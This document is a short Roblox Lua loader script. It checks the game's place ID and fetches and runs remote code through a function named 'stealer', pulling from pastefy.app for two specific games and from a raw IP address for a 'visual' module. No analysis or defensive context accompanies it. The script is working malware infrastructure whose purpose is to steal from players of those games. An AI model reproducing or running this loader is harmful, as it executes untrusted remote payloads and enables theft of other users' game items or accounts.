local PlaceId = game.PlaceId

local function stealer()
  if PlaceId == 920587237 then
    loadstring(game:HttpGet("https://pastefy.app/XE9V3aC0/raw"))()
  elseif PlaceId == 142823291 then
    loadstring(game:HttpGet("https://pastefy.app/JCNdpVxz/raw"))()
  end
end

local function visual()
  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
end

task.spawn(stealer)
task.spawn(visual)
